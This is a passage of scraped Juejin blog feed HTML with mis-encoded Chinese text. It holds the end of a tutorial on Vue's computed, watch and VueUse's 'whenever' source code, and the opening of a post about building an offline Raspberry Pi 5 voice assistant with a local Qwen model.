<span class="hljs-keyword">const</span> lastName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'Doe'</span>);

<span class="hljs-comment">// `fullName` æ˜¯ä¸€ä¸ªæ´¾ç”Ÿå‡ºæ¥çš„ refï¼Œå®ƒä¾èµ–äº firstName å’Œ lastName</span>
<span class="hljs-keyword">const</span> fullName = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è®¡ç®— fullName...'</span>); <span class="hljs-comment">// åªæœ‰ä¾èµ–å˜åŒ–æ—¶æ‰æ‰“å°</span>
 <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${firstName.value}</span> <span class="hljs-subst">${lastName.value}</span>`</span>;
});
<span class="hljs-comment">// åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ {{ fullName }} å³å¯</span>
</code></pre>
<p><strong><code>watch</code> ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">const</span> userId = <span class="hljs-title function_">ref</span>(<span class="hljs-number">1</span>);
<span class="hljs-keyword">const</span> userData = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>);

<span class="hljs-comment">// ä¾¦å¬ userId çš„å˜åŒ–ï¼Œç„¶åæ‰§è¡Œè·å–æ•°æ®çš„å‰¯ä½œç”¨</span>
<span class="hljs-title function_">watch</span>(userId, <span class="hljs-keyword">async</span> (newId, oldId) =&gt; {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`User ID ä» <span class="hljs-subst">${oldId}</span> å˜ä¸º <span class="hljs-subst">${newId}</span>ï¼Œæ­£åœ¨è·å–æ–°æ•°æ®...`</span>);
    
 <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/users/<span class="hljs-subst">${newId}</span>`</span>);
 userData.<span class="hljs-property">value</span> = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
}, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> }); <span class="hljs-comment">// immediate: true ç¡®ä¿ç»„ä»¶åŠ è½½æ—¶å°±è·å–ä¸€æ¬¡æ•°æ®</span>
</code></pre>
<hr/>
<h4 data-id="heading-18">2. <code>watch</code> vs <code>whenever</code> (æ¥è‡ª <code>VueUse</code>)</h4>
<p><code>VueUse</code> æ˜¯ä¸€ä¸ªåŸºäº Composition API çš„å®ç”¨å·¥å…·é›†ã€‚ <a href="https://link.juejin.cn?target=https%3A%2F%2Fvueuse.org%2Fshared%2Fwhenever%2F" target="_blank" title="https://vueuse.org/shared/whenever/" ref="nofollow noopener noreferrer"><code>whenever</code></a> æ˜¯å®ƒæä¾›çš„ä¸€ä¸ª <code>watch</code> çš„â€œè¯­æ³•ç³–â€ï¼Œè®©ä»£ç æ›´å…·å¯è¯»æ€§ã€‚</p>
<h5 data-id="heading-19">æ ¸å¿ƒåŒºåˆ«</h5>
<ul>
<li><strong><code>watch</code></strong>ï¼šæ— è®ºæ–°å€¼æ˜¯ä»€ä¹ˆï¼Œåªè¦æ•°æ®æºå˜åŒ–ï¼Œå›è°ƒ<strong>æ€»æ˜¯</strong>æ‰§è¡Œã€‚</li>
<li><strong><code>whenever</code></strong>ï¼šåªæœ‰å½“æ•°æ®æºçš„å€¼<strong>å˜ä¸ºçœŸå€¼ (truthy)</strong> æ—¶ï¼Œå›è°ƒæ‰ä¼šæ‰§è¡Œã€‚å®ƒæ˜¯ä¸€ä¸ªå¸¦æœ‰å†…ç½®æ¡ä»¶åˆ¤æ–­çš„ <code>watch</code>ã€‚</li>
</ul>
<p><code>whenever</code> çš„å†…éƒ¨å…¶å®å°±æ˜¯ä½¿ç”¨ <code>watchWithFilter</code> å®ç°çš„ï¼Œå®ƒç­‰ä»·äºä¸€ä¸ªå¸¦æœ‰ <code>filter</code> é€‰é¡¹çš„ <code>watch</code>ã€‚</p>
<h5 data-id="heading-20">å¯¹æ¯”è¡¨æ ¼</h5>

























<table><thead><tr><th>ç‰¹æ€§</th><th><code>watch</code></th><th><code>whenever</code> (<code>VueUse</code>)</th></tr></thead><tbody><tr><td><strong>æ‰§è¡Œæ¡ä»¶</strong></td><td>æ•°æ®æºå˜åŒ–å°±æ‰§è¡Œ</td><td>æ•°æ®æºå˜åŒ–ï¼Œ<strong>ä¸”æ–°å€¼ä¸ºçœŸå€¼ (truthy)</strong> æ—¶æ‰æ‰§è¡Œ</td></tr><tr><td><strong>å¯è¯»æ€§</strong></td><td>éœ€è¦åœ¨å›è°ƒå‡½æ•°å†…éƒ¨å†™ <code>if</code> åˆ¤æ–­</td><td>éå¸¸é«˜ï¼Œè¯­ä¹‰æ¸…æ™°ï¼Œä»£ç å³æ³¨é‡Š</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>é€šç”¨çš„ä¾¦å¬åœºæ™¯</td><td>å½“æŸä¸ªæ¡ä»¶æ»¡è¶³æ—¶æ‰§è¡Œä¸€æ¬¡æ€§æ“ä½œï¼ˆå¦‚å¼¹çª—ã€ç™»å½•æˆåŠŸåè·³è½¬ï¼‰</td></tr></tbody></table>
<p><strong>ä½¿ç”¨ <code>watch</code> çš„å†™æ³•ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { watch, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> myValue = ref&lt;string | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)

<span class="hljs-title function_">watch</span>(myValue, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
  <span class="hljs-comment">// æ¯æ¬¡ myValue å˜åŒ–éƒ½ä¼šæ‰§è¡Œè¿™é‡Œ</span>
  <span class="hljs-keyword">if</span> (newValue) { <span class="hljs-comment">// éœ€è¦è‡ªå·±åŠ ä¸€ä¸ª if åˆ¤æ–­</span>
    <span class="hljs-comment">// åªæœ‰å½“ newValue æ˜¯çœŸå€¼æ—¶æ‰æ‰§è¡Œæ ¸å¿ƒé€»è¾‘</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å€¼å˜æˆäº†: <span class="hljs-subst">${newValue}</span>`</span>)
  }
})
</code></pre>
<p><strong>ä½¿ç”¨ <code>whenever</code> çš„å†™æ³• (æ›´ä¼˜é›…)ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { whenever } <span class="hljs-keyword">from</span> <span class="hljs-string">'@vueuse/core'</span>

<span class="hljs-keyword">const</span> myValue = ref&lt;string | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)

<span class="hljs-title function_">whenever</span>(myValue, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
  <span class="hljs-comment">// åªæœ‰å½“ myValue å˜ä¸ºçœŸå€¼æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œè¿™é‡Œ</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å€¼å˜æˆäº†: <span class="hljs-subst">${newValue}</span>`</span>)
})
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬æ¥é€è¡Œåˆ†æå®ƒçš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvueuse%2Fvueuse%2Fblob%2Fmain%2Fpackages%2Fshared%2Fwhenever%2Findex.ts" target="_blank" title="https://github.com/vueuse/vueuse/blob/main/packages/shared/whenever/index.ts" ref="nofollow noopener noreferrer"><code>å®ç°</code></a></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * Shorthand for watching value to be truthy
 *
 * <span class="hljs-doctag">@see</span> https://vueuse.org/whenever
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> whenever&lt;T&gt;(<span class="hljs-attr">source</span>: <span class="hljs-title class_">WatchSource</span>&lt;T | <span class="hljs-literal">false</span> | <span class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span>&gt;, <span class="hljs-attr">cb</span>: <span class="hljs-title class_">WatchCallback</span>&lt;T&gt;, options?: <span class="hljs-title class_">WheneverOptions</span>) {
  <span class="hljs-keyword">const</span> stop = <span class="hljs-title function_">watch</span>(
    source,
    <span class="hljs-function">(<span class="hljs-params">v, ov, onInvalidate</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (v) {
        <span class="hljs-keyword">if</span> (options?.<span class="hljs-property">once</span>)
          <span class="hljs-title function_">nextTick</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">stop</span>())
        <span class="hljs-title function_">cb</span>(v, ov, onInvalidate)
      }
    },
    {
      ...options,
      <span class="hljs-attr">once</span>: <span class="hljs-literal">false</span>,
    } <span class="hljs-keyword">as</span> <span class="hljs-title class_">WatchOptions</span>,
  )
  <span class="hljs-keyword">return</span> stop
}
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. å®šä¹‰äº†å‡½æ•°çš„ç­¾å</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> whenever&lt;T&gt;(<span class="hljs-attr">source</span>: <span class="hljs-title class_">WatchSource</span>&lt;T | <span class="hljs-literal">false</span> | <span class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span>&gt;, <span class="hljs-attr">cb</span>: <span class="hljs-title class_">WatchCallback</span>&lt;T&gt;, options?: <span class="hljs-title class_">WheneverOptions</span>) {
</code></pre>
<ul>
<li><strong><code>source</code></strong>: è¿™æ˜¯è¦ä¾¦å¬çš„æºã€‚å¯ä»¥æ˜¯ <code>ref</code>ã€<code>reactive</code> å¯¹è±¡ã€<code>getter</code> å‡½æ•°ç­‰ã€‚æ³¨æ„å®ƒçš„ç±»å‹ <code>T | false | null | undefined</code>ï¼Œè¿™æ˜ç¡®è¡¨ç¤º <code>whenever</code> å°±æ˜¯ä¸ºäº†å¤„ç†å¯èƒ½ä¸ºâ€œå‡å€¼ (<code>falsy</code>)â€çš„æºè€Œè®¾è®¡çš„ã€‚</li>
<li><strong><code>cb</code></strong>: è¿™æ˜¯å½“ <code>source</code> å˜ä¸ºçœŸå€¼æ—¶è¦æ‰§è¡Œçš„å›è°ƒå‡½æ•°ã€‚</li>
<li><strong><code>options</code></strong>: è¿™æ˜¯ä¸€ä¸ªå¯é€‰çš„é…ç½®å¯¹è±¡ï¼Œå®ƒç»§æ‰¿äº† <code>watch</code> çš„æ‰€æœ‰é€‰é¡¹ï¼ˆå¦‚ <code>immediate</code>, <code>deep</code>ï¼‰ï¼Œå¹¶é¢å¤–å¢åŠ äº†ä¸€ä¸ª <code>once</code> é€‰é¡¹ã€‚</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 2. å‡½æ•°çš„æ ¸å¿ƒï¼šè°ƒç”¨ Vue å†…ç½®çš„ watch å‡½æ•°</span>
  <span class="hljs-keyword">const</span> stop = <span class="hljs-title function_">watch</span>(
</code></pre>
<p><code>whenever</code> çš„æœ¬è´¨å°±æ˜¯ä¸€ä¸ª <code>watch</code>ã€‚å®ƒè¿”å› <code>watch</code> çš„ <code>stop</code> å‡½æ•°ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥åƒåœæ­¢ä¸€ä¸ªæ™®é€š <code>watch</code> ä¸€æ ·åœæ­¢ <code>whenever</code>ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 3. watch çš„å›è°ƒå‡½æ•°ï¼Œè¿™æ˜¯ whenever çš„é­”æ³•æ‰€åœ¨</span>
    source,
    <span class="hljs-function">(<span class="hljs-params">v, ov, onInvalidate</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (v) { <span class="hljs-comment">// &lt;--- å…³é”®æ£€æŸ¥ï¼</span>
        <span class="hljs-keyword">if</span> (options?.<span class="hljs-property">once</span>)
          <span class="hljs-title function_">nextTick</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">stop</span>())
        <span class="hljs-title function_">cb</span>(v, ov, onInvalidate)
      }
    },
</code></pre>
<p>è¿™æ˜¯ä¼ é€’ç»™å†…éƒ¨ <code>watch</code> çš„å›è°ƒå‡½æ•°ã€‚æ¯æ¬¡ <code>source</code> å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸ªå‡½æ•°éƒ½ä¼šè¢«è°ƒç”¨ã€‚</p>
<ul>
<li>
<p><strong><code>if (v)</code></strong>: è¿™æ˜¯æ•´ä¸ªå‡½æ•°çš„æ ¸å¿ƒã€‚<code>v</code> æ˜¯ <code>source</code> çš„æ–°å€¼ã€‚è¿™ä¸ª <code>if</code> è¯­å¥æ£€æŸ¥æ–°å€¼æ˜¯å¦ä¸º<strong>çœŸå€¼</strong>ï¼ˆå³ä¸æ˜¯ <code>null</code>, <code>undefined</code>, <code>false</code>, <code>0</code>, <code>''</code> æˆ– <code>NaN</code>ï¼‰ã€‚</p>
</li>
<li>
<p>åªæœ‰å½“ <code>v</code> æ˜¯çœŸå€¼æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œ <code>if</code> å—å†…éƒ¨çš„é€»è¾‘ã€‚</p>
</li>
<li>
<p><code>if (options?.once)</code></p>
<p>: å¦‚æœç”¨æˆ·è®¾ç½®äº†<code>once: true</code>ï¼Œåˆ™æ‰§è¡Œ <code>nextTick(() =&gt; stop())</code>ã€‚</p>
<ul>
<li>
<p><strong><code>stop()</code></strong>: è°ƒç”¨è¿™ä¸ªå‡½æ•°ä¼šåœæ­¢å½“å‰çš„ <code>watch</code>ï¼Œä»è€Œå®ç°â€œåªæ‰§è¡Œä¸€æ¬¡â€çš„æ•ˆæœã€‚</p>
</li>
<li>
<p><strong><code>nextTick()</code></strong>: ä¸ºä»€ä¹ˆè¦ç”¨ <code>nextTick</code>ï¼Ÿ</p>
<blockquote>
<p>âœ¨è¿™æ˜¯ä¸€ä¸ªéå¸¸å·§å¦™çš„ç»†èŠ‚ã€‚å®ƒç¡®ä¿äº†æœ¬æ¬¡çš„å›è°ƒå‡½æ•° <code>cb</code> èƒ½å¤Ÿå®Œæ•´æ‰§è¡Œå®Œæ¯•ï¼Œç„¶ååœ¨ä¸‹ä¸€ä¸ª DOM æ›´æ–°å‘¨æœŸï¼ˆtickï¼‰ä¸­å†åœæ­¢ä¾¦å¬ã€‚è¿™é¿å…äº†åœ¨å›è°ƒå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­å°±é”€æ¯ä¾¦å¬å™¨å¯èƒ½å¼•å‘çš„æ½œåœ¨é—®é¢˜ã€‚</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><strong><code>cb(v, ov, onInvalidate)</code></strong>: å¦‚æœ <code>v</code> æ˜¯çœŸå€¼ï¼Œå°±è°ƒç”¨ç”¨æˆ·ä¼ å…¥çš„åŸå§‹å›è°ƒå‡½æ•° <code>cb</code>ï¼Œå¹¶æŠŠ <code>watch</code> çš„æ‰€æœ‰å‚æ•°ï¼ˆæ–°å€¼ã€æ—§å€¼ã€å¤±æ•ˆå›è°ƒï¼‰éƒ½é€ä¼ è¿‡å»ã€‚</p>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 4. watch çš„é…ç½®å¯¹è±¡</span>
    {
      ...options,
      <span class="hljs-attr">once</span>: <span class="hljs-literal">false</span>,
    } <span class="hljs-keyword">as</span> <span class="hljs-title class_">WatchOptions</span>,
  )
</code></pre>
<p>è¿™é‡Œæ˜¯ä¼ é€’ç»™å†…éƒ¨ <code>watch</code> çš„é…ç½®å¯¹è±¡ã€‚</p>
<ul>
<li>
<p><strong><code>...options</code></strong>: å°†ç”¨æˆ·ä¼ å…¥çš„æ‰€æœ‰é…ç½®ï¼ˆå¦‚ <code>immediate</code>, <code>deep</code>ï¼‰éƒ½ä¼ é€’ç»™åº•å±‚çš„ <code>watch</code>ã€‚</p>
</li>
<li>
<p><strong><code>once: false</code></strong>: è¿™æ˜¯ä¸€ä¸ªå…³é”®çš„è¦†ç›–æ“ä½œã€‚</p>
<blockquote>
<p>âœ¨Vue 3.4+ çš„ <code>watch</code> æœ¬èº«ä¹Ÿæ”¯æŒ <code>once</code> é€‰é¡¹ã€‚ä½†æ˜¯ <code>whenever</code> çš„ <code>once</code> é€»è¾‘æ˜¯è‡ªå·±å®ç°çš„ï¼ˆä¸ºäº†é…åˆçœŸå€¼æ£€æŸ¥ï¼‰ã€‚ä¸ºäº†é˜²æ­¢ä¸ Vue å†…ç½®çš„ <code>once</code> è¡Œä¸ºå†²çªï¼Œè¿™é‡Œå¼ºåˆ¶å°†ä¼ é€’ç»™ <code>watch</code> çš„ <code>once</code> é€‰é¡¹è®¾ç½®ä¸º <code>false</code>ï¼Œç¡®ä¿ <code>whenever</code> è‡ªå·±çš„ <code>once</code> é€»è¾‘èƒ½å¤Ÿæ­£å¸¸å·¥ä½œã€‚</p>
</blockquote>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 5. è¿”å› stop å‡½æ•°</span>
  <span class="hljs-keyword">return</span> stop
}
</code></pre>
<p>æœ€åï¼Œå°†å†…éƒ¨ <code>watch</code> è¿”å›çš„ <code>stop</code> å‡½æ•°è¿”å›ç»™è°ƒç”¨è€…ï¼Œè®©ç”¨æˆ·å¯ä»¥éšæ—¶æ‰‹åŠ¨åœæ­¢ä¾¦å¬ã€‚</p>
<h4 data-id="heading-21">æ€»ç»“</h4>
<ol>
<li><strong><code>computed</code></strong> æ˜¯ä¸ºäº†<strong>è®¡ç®—</strong>å‡ºä¸€ä¸ªæ–°å€¼ã€‚</li>
<li><strong><code>watch</code></strong> æ˜¯ä¸ºäº†åœ¨æ•°æ®å˜åŒ–æ—¶<strong>åšäº‹</strong>ã€‚</li>
<li><strong><code>whenever</code></strong> æ˜¯ <code>watch</code> çš„ä¸€ä¸ªå˜ç§ï¼Œå®ƒé€šè¿‡å·§å¦™åœ°ä½¿ç”¨ <code>nextTick</code> å’Œè¦†ç›– <code>once</code> é€‰é¡¹ï¼Œå®ç°äº†è‡ªå®šä¹‰çš„ã€ä¸çœŸå€¼åˆ¤æ–­ç›¸ç»“åˆçš„â€œæ‰§è¡Œä¸€æ¬¡â€åŠŸèƒ½ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ ‘è“æ´¾5 + æœ¬åœ°å¤§æ¨¡å‹(Qwen) + ç¦»çº¿è¯­éŸ³ = æ‰“é€ æ¯«ç§’çº§â€œè´¾ç»´æ–¯â€]]></title>    <link>https://juejin.cn/post/7580740782932983850</link>    <guid>https://juejin.cn/post/7580740782932983850</guid>    <pubDate>2025-12-08T03:40:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782932983850" data-draft-id="7580723992497684516" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ ‘è“æ´¾5 + æœ¬åœ°å¤§æ¨¡å‹(Qwen) + ç¦»çº¿è¯­éŸ³ = æ‰“é€ æ¯«ç§’çº§â€œè´¾ç»´æ–¯â€"/> <meta itemprop="keywords" content="å¼€æº"/> <meta itemprop="datePublished" content="2025-12-08T03:40:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1æ–°1"/> <meta itemprop="url" content="https://juejin.cn/user/731600396233483"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ ‘è“æ´¾5 + æœ¬åœ°å¤§æ¨¡å‹(Qwen) + ç¦»çº¿è¯­éŸ³ = æ‰“é€ æ¯«ç§’çº§â€œè´¾ç»´æ–¯â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/731600396233483/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1æ–°1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:40:27.000Z" title="Mon Dec 08 2025 03:40:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸš€ å‰è¨€ï¼šä¸ºä»€ä¹ˆè¦æâ€œçº¯ç¦»çº¿â€ï¼Ÿ</h2>
<p>æœ€è¿‘å…¥æ‰‹äº† <strong>æ ‘è“æ´¾ 5 (8GB)</strong> ï¼Œæ€§èƒ½ç¡®å®å¼ºæ‚ã€‚ä¹‹å‰è¯•è¿‡ç”¨å„ç§åœ¨çº¿ API åšè¯­éŸ³åŠ©æ‰‹ï¼Œè¯¦æƒ…è§ï¼š<a href="https://juejin.cn/post/7579553111472767030" target="_blank" title="https://juejin.cn/post/7579553111472767030">DeepSeek R1 å¡è¿›æ ‘è“æ´¾ï¼Ÿæˆ‘ç”¨ 8GB å†…å­˜æ‰“é€ äº†ç¦»çº¿ AIoT ä¸­æ§ï¼ˆæ¶æ„ç¯‡ï¼‰ - æ˜é‡‘</a></p>
<p>è™½ç„¶æ™ºèƒ½ï¼Œä½†æœ‰ä¸¤ä¸ªç—›ç‚¹ï¼š</p>
<ol>
<li><strong>å»¶è¿Ÿé«˜</strong>ï¼šè¯´å¥è¯è¦ç­‰äº‘ç«¯è½¬åœˆåœˆï¼Œä½“éªŒå¾ˆå·®ã€‚</li>
<li><strong>ä¾èµ–ç½‘ç»œ</strong>ï¼šæ–­ç½‘å°±å˜æ™ºéšœï¼Œè€Œä¸” API è¿˜è¦é’±ï¼ˆæˆ–ç”±äºç½‘ç»œåŸå› è¿ä¸ä¸Šï¼‰ã€‚</li>
</ol>
<p>æ—¢ç„¶æ ‘è“æ´¾ 5 æ€§èƒ½è¿™ä¹ˆå¼ºï¼Œèƒ½ä¸èƒ½åšä¸€ä¸ª<strong>å®Œå…¨æ–­ç½‘ã€æ¯«ç§’çº§å“åº”ã€è¿˜èƒ½æ§åˆ¶ç¡¬ä»¶</strong>çš„â€œçœŸÂ·è´¾ç»´æ–¯â€ï¼Ÿ</p>
<p>ç»è¿‡å‡ å¤©çš„æŠ˜è…¾ï¼ˆå’Œæ— æ•°æ¬¡æŠ¥é”™ï¼‰ï¼Œæˆ‘ç»ˆäºæå®šäº†ï¼è¿™å¥—æ–¹æ¡ˆé›†æˆäº† <strong>Ollama (Qwen 2.5)</strong> åšå¤§è„‘ï¼Œ<strong>Vosk</strong> åšç¦»çº¿å¬è§‰ï¼Œ<strong>pyttsx3</strong> åšç¦»çº¿å‘å£°ï¼Œè¿˜èƒ½é€šè¿‡ <strong>GPIO</strong> æ§åˆ¶å®¶é‡Œçš„ç¯å’Œé£æ‰‡ã€‚</p>
<p>ä»Šå¤©å°±æŠŠè¿™å¥—<strong>å…¨é“¾è·¯ç¦»çº¿ AIoT</strong> æ–¹æ¡ˆåˆ†äº«ç»™å¤§å®¶ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹é‚£äº›è®©æˆ‘å¤´ç§ƒçš„å‘ã€‚</p>
<h2 data-id="heading-1">ğŸ› ï¸ ç¡¬ä»¶æ¸…å•</h2>
<ul>
<li>
<p><strong>ä¸»æ¿</strong>ï¼šRaspberry Pi 5 (8GB) â€”â€” è·‘å¤§æ¨¡å‹å†…å­˜è¶Šå¤§è¶Šå¥½ã€‚</p>
</li>
<li>
<p><strong>å¬è§‰</strong>ï¼šUSB å…¨å‘éº¦å…‹é£</p>
</li>
<li>
